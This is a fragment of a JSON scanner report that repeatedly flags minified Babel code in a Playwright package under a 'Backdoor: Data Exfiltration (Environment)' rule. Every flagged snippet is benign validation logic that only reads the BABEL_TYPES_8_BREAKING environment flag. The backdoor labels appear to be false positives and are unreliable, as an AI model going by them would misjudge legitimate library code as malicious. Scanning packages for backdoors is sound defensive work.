                      "markdown": "`tEach)((0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{loc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 27090,
                  "endLine": 7,
                  "endColumn": 27101,
                  "snippet": {
                    "text": "al:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a source\")})},attributes:{optional:!0,validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ImportAttribute\")))},assertions:{optional:!0,validate:(0,h.chain)((0,h.assertVal",
                    "rendered": {
                      "text": "al:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a source\")})},attributes:{optional:!0,validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ImportAttribute\")))},assertions:{optional:!0,validate:(0,h.chain)((0,h.assertVal",
                      "markdown": "`al:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a source\")})},attributes:{optional:!0,validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ImportAttribute\")))},assertions:{optional:!0,validate:(0,h.chain)((0,h.assertVal`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 26886,
                  "endLine": 7,
                  "endColumn": 26897,
                  "snippet": {
                    "text": "pecifiers\",\"source\"],visitor:[\"declaration\",\"specifiers\",\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{declaration:{optional:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a sou",
                    "rendered": {
                      "text": "pecifiers\",\"source\"],visitor:[\"declaration\",\"specifiers\",\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{declaration:{optional:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a sou",
                      "markdown": "`pecifiers\",\"source\"],visitor:[\"declaration\",\"specifiers\",\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{declaration:{optional:!0,validate:(0,h.chain)((0,h.assertNodeType)(\"Declaration\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.specifiers.length)throw new TypeError(\"Only declaration or specifiers is allowed on ExportNamedDeclaration\")},{oneOfNodeTypes:[\"Declaration\"]}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.source)throw new TypeError(\"Cannot export a declaration from a sou`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 25516,
                  "endLine": 7,
                  "endColumn": 25527,
                  "snippet": {
                    "text": "),optional:!0},mixins:{validate:(0,h.assertNodeType)(\"InterfaceExtends\"),optional:!0},declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},abstract:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0}},validate:function(){let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){process.env.BABEL_TYPES_8_BREAKING&&((0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id))}}()});Q(\"ExportAllDeclaration\",{builder:[\"source\"],visitor:[\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{source:{validate:(0,h.as",
                    "rendered": {
                      "text": "),optional:!0},mixins:{validate:(0,h.assertNodeType)(\"InterfaceExtends\"),optional:!0},declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},abstract:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0}},validate:function(){let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){process.env.BABEL_TYPES_8_BREAKING&&((0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id))}}()});Q(\"ExportAllDeclaration\",{builder:[\"source\"],visitor:[\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{source:{validate:(0,h.as",
                      "markdown": "`),optional:!0},mixins:{validate:(0,h.assertNodeType)(\"InterfaceExtends\"),optional:!0},declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},abstract:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0}},validate:function(){let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){process.env.BABEL_TYPES_8_BREAKING&&((0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id))}}()});Q(\"ExportAllDeclaration\",{builder:[\"source\"],visitor:[\"source\",\"attributes\",\"assertions\"],aliases:[\"Statement\",\"Declaration\",\"ImportOrExportDeclaration\",\"ExportDeclaration\"],fields:{source:{validate:(0,h.as`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 21038,
                  "endLine": 7,
                  "endColumn": 21049,
                  "snippet": {
                    "text": "(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"LVal\");let e=(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\"),t=(0,h.assertNodeType)(\"Identifier\");return function(r,n,s){(r.init?e:t)(r,n,s)}}()},definite:{optional:!0,validate:(0,h.assertValueType)(\"boolean\")},init:{optional:!0,v",
                    "rendered": {
                      "text": "(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"LVal\");let e=(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\"),t=(0,h.assertNodeType)(\"Identifier\");return function(r,n,s){(r.init?e:t)(r,n,s)}}()},definite:{optional:!0,validate:(0,h.assertValueType)(\"boolean\")},init:{optional:!0,v",
                      "markdown": "`(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"LVal\");let e=(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\"),t=(0,h.assertNodeType)(\"Identifier\");return function(r,n,s){(r.init?e:t)(r,n,s)}}()},definite:{optional:!0,validate:(0,h.assertValueType)(\"boolean\")},init:{optional:!0,v`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 20739,
                  "endLine": 7,
                  "endColumn": 20750,
                  "snippet": {
                    "text": "],fields:{declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},kind:{validate:(0,h.assertOneOf)(\"var\",\"let\",\"const\",\"using\",\"await using\")},declarations:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"VariableDeclarator\")))}},validate(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.",
                    "rendered": {
                      "text": "],fields:{declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},kind:{validate:(0,h.assertOneOf)(\"var\",\"let\",\"const\",\"using\",\"await using\")},declarations:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"VariableDeclarator\")))}},validate(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.",
                      "markdown": "`],fields:{declare:{validate:(0,h.assertValueType)(\"boolean\"),optional:!0},kind:{validate:(0,h.assertOneOf)(\"var\",\"let\",\"const\",\"using\",\"await using\")},declarations:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"VariableDeclarator\")))}},validate(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&(0,ur.default)(\"ForXStatement\",e,{left:r})&&r.declarations.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${e.type}`)}});Q(\"VariableDeclarator\",{visitor:[\"id\",\"init\"],fields:{id:{validate:function(){if(!process.env.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 20089,
                  "endLine": 7,
                  "endColumn": 20100,
                  "snippet": {
                    "text": "x:{default:!0},argument:{validate:(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UNARY_OPERATORS)}},visitor:[\"argument\"],aliases:[\"UnaryLike\",\"Expression\"]});Q(\"UpdateExpression\",{builder:[\"operator\",\"argument\",\"prefix\"],fields:{prefix:{default:!1},argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\"):(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UPDATE_OPERATORS)}},visitor:[\"argument\"],aliases:[\"Expression\"]});Q(\"VariableDeclaration\",{builder:[\"kind\",\"declarations\"],visitor:[\"declaratio",
                    "rendered": {
                      "text": "x:{default:!0},argument:{validate:(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UNARY_OPERATORS)}},visitor:[\"argument\"],aliases:[\"UnaryLike\",\"Expression\"]});Q(\"UpdateExpression\",{builder:[\"operator\",\"argument\",\"prefix\"],fields:{prefix:{default:!1},argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\"):(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UPDATE_OPERATORS)}},visitor:[\"argument\"],aliases:[\"Expression\"]});Q(\"VariableDeclaration\",{builder:[\"kind\",\"declarations\"],visitor:[\"declaratio",
                      "markdown": "`x:{default:!0},argument:{validate:(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UNARY_OPERATORS)}},visitor:[\"argument\"],aliases:[\"UnaryLike\",\"Expression\"]});Q(\"UpdateExpression\",{builder:[\"operator\",\"argument\",\"prefix\"],fields:{prefix:{default:!1},argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\"):(0,h.assertNodeType)(\"Expression\")},operator:{validate:(0,h.assertOneOf)(...Ha.UPDATE_OPERATORS)}},visitor:[\"argument\"],aliases:[\"Expression\"]});Q(\"VariableDeclaration\",{builder:[\"kind\",\"declarations\"],visitor:[\"declaratio`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 19388,
                  "endLine": 7,
                  "endColumn": 19399,
                  "snippet": {
                    "text": "tatement\",\"Terminatorless\",\"CompletionStatement\"],fields:{argument:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"TryStatement\",{visitor:[\"block\",\"handler\",\"finalizer\"],aliases:[\"Statement\"],fields:{block:{validate:(0,h.chain)((0,h.assertNodeType)(\"BlockStatement\"),Object.assign(function(e){if(process.env.BABEL_TYPES_8_BREAKING&&!e.handler&&!e.finalizer)throw new TypeError(\"TryStatement expects either a handler or finalizer, or both\")},{oneOfNodeTypes:[\"BlockStatement\"]}))},handler:{optional:!0,validate:(0,h.assertNodeType)(\"CatchClause\")},finalizer:{optional:!0,validate:(0,h.assertNodeType)(\"BlockS",
                    "rendered": {
                      "text": "tatement\",\"Terminatorless\",\"CompletionStatement\"],fields:{argument:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"TryStatement\",{visitor:[\"block\",\"handler\",\"finalizer\"],aliases:[\"Statement\"],fields:{block:{validate:(0,h.chain)((0,h.assertNodeType)(\"BlockStatement\"),Object.assign(function(e){if(process.env.BABEL_TYPES_8_BREAKING&&!e.handler&&!e.finalizer)throw new TypeError(\"TryStatement expects either a handler or finalizer, or both\")},{oneOfNodeTypes:[\"BlockStatement\"]}))},handler:{optional:!0,validate:(0,h.assertNodeType)(\"CatchClause\")},finalizer:{optional:!0,validate:(0,h.assertNodeType)(\"BlockS",
                      "markdown": "`tatement\",\"Terminatorless\",\"CompletionStatement\"],fields:{argument:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"TryStatement\",{visitor:[\"block\",\"handler\",\"finalizer\"],aliases:[\"Statement\"],fields:{block:{validate:(0,h.chain)((0,h.assertNodeType)(\"BlockStatement\"),Object.assign(function(e){if(process.env.BABEL_TYPES_8_BREAKING&&!e.handler&&!e.finalizer)throw new TypeError(\"TryStatement expects either a handler or finalizer, or both\")},{oneOfNodeTypes:[\"BlockStatement\"]}))},handler:{optional:!0,validate:(0,h.assertNodeType)(\"CatchClause\")},finalizer:{optional:!0,validate:(0,h.assertNodeType)(\"BlockS`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17688,
                  "endLine": 7,
                  "endColumn": 17699,
                  "snippet": {
                    "text": "fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+)\\]/.exec(t);if(!r)throw new Error(\"Internal Babel error: malformed key.\");let[,n,s]=r;if(e[n].length>+s+1)throw new TypeError(`RestElement must be last element of ${n}`)}});Q(\"ReturnStatement\",{visitor:[\"argument\"],aliases:[\"Statement\",\"Terminatorles",
                    "rendered": {
                      "text": "fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+)\\]/.exec(t);if(!r)throw new Error(\"Internal Babel error: malformed key.\");let[,n,s]=r;if(e[n].length>+s+1)throw new TypeError(`RestElement must be last element of ${n}`)}});Q(\"ReturnStatement\",{visitor:[\"argument\"],aliases:[\"Statement\",\"Terminatorles",
                      "markdown": "`fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+)\\]/.exec(t);if(!r)throw new Error(\"Internal Babel error: malformed key.\");let[,n,s]=r;if(e[n].length>+s+1)throw new TypeError(`RestElement must be last element of ${n}`)}});Q(\"ReturnStatement\",{visitor:[\"argument\"],aliases:[\"Statement\",\"Terminatorles`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17437,
                  "endLine": 7,
                  "endColumn": 17448,
                  "snippet": {
                    "text": "){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+",
                    "rendered": {
                      "text": "){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+",
                      "markdown": "`){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"ArrayPattern\",\"ObjectPattern\",\"MemberExpression\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\")}}),validate(e,t){if(!process.env.BABEL_TYPES_8_BREAKING)return;let r=/(\\w+)\\[(\\d+`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17143,
                  "endLine": 7,
                  "endColumn": 17154,
                  "snippet": {
                    "text": "\"key\",\"value\",\"decorators\"],aliases:[\"UserWhitespacable\",\"Property\",\"ObjectMember\"],validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"Pattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSNonNullExpression\",\"TSTypeAssertion\"),t=(0,h.assertNodeType)(\"Expression\");return function(r,n,s){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL",
                    "rendered": {
                      "text": "\"key\",\"value\",\"decorators\"],aliases:[\"UserWhitespacable\",\"Property\",\"ObjectMember\"],validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"Pattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSNonNullExpression\",\"TSTypeAssertion\"),t=(0,h.assertNodeType)(\"Expression\");return function(r,n,s){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL",
                      "markdown": "`\"key\",\"value\",\"decorators\"],aliases:[\"UserWhitespacable\",\"Property\",\"ObjectMember\"],validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"Pattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSNonNullExpression\",\"TSTypeAssertion\"),t=(0,h.assertNodeType)(\"Expression\");return function(r,n,s){if(!process.env.BABEL_TYPES_8_BREAKING)return;((0,ur.default)(\"ObjectPattern\",r)?e:t)(s,\"value\",s.value)}}()});Q(\"RestElement\",{visitor:[\"argument\",\"typeAnnotation\"],builder:[\"argument\"],aliases:[\"LVal\",\"PatternLike\"],deprecatedAlias:\"RestProperty\",fields:Object.assign({},ki(),{argument:{validate:process.env.BABEL`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 16511,
                  "endLine": 7,
                  "endColumn": 16522,
                  "snippet": {
                    "text": "n\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if key is not an Identifier\")}),default:!1},decorators:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Decorator\"))),op",
                    "rendered": {
